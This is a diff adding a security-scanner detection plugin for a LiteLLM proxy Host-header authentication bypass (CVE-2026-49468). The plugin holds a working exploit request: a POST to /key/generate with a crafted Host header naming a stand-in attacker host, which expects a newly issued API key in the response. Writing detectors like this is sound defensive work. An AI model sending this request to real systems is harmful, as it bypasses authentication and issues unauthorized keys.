@@ -1,0 +1,78 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "Litellm_Auth_Bypass_CVE_2026_49468"
+  author: "mangeshwalsane2-hash"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2026-49468"
+  }
+  severity: CRITICAL
+  title: "Host Header Authentication Bypass affecting LiteLLM proxy (CVE-2026-49468)"
+  description: "LiteLLM contains an authentication bypass vulnerability via Host header route confusion. By sending a crafted Host header containing a fragment or control sequence (e.g., #@), an attacker can bypass authorization gates on administrative routes such as /key/generate."
+  recommendation: "Upgrade LiteLLM to version 1.84.0 or higher."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2026-49468"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_litellm"
+  http_request: {
+    method: GET
+    uri: "/health/readiness"
+    response: {
+      http_status: 200
+    }
+  }
+}
+
+actions: {
+  name: "trigger_auth_bypass"
+  http_request: {
+    method: POST
+    uri: "/key/generate"
+    headers: [
+      { name: "Host" value: "localhost:4000/#@attacker.example" },
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: "{\"models\": [\"*\"]}"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "\"key\":\"sk-" }
+        ]
+      }
+    }
+  }
+}
+
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  actions: [
+    "fingerprint_litellm",
+    "trigger_auth_bypass"
+  ]
+}
